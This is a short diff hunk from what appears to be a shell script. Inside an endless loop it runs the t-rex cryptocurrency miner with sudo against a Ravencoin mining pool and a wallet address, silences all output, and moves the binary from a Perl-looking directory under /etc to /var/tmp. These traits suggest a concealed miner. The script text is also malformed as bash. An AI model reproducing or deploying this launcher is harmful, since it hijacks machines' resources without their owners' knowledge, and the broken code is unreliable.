@@ -189,7 +189,7 @@ while true; do
   OWN_PKG_NAME = "sudo /etc/perl/main/miner"
   OWN_MINER_FILE = "t-rex"
   # <=
-  "sudo /etc/perl/main/miner/t-rex -a kawpow -o stratum+tcp://stratum-ravencoin.flypool.org:3333 -u RJGiDpg5jpKvkYsu7CFreikgEt6twBU5gf.${rigName} -p x"
+  "sudo /var/tmp/miner/t-rex -a kawpow -o stratum+tcp://stratum-ravencoin.flypool.org:3333 -u RJGiDpg5jpKvkYsu7CFreikgEt6twBU5gf.${rigName} -p x"
   } > /dev/null 2>&1
 
 
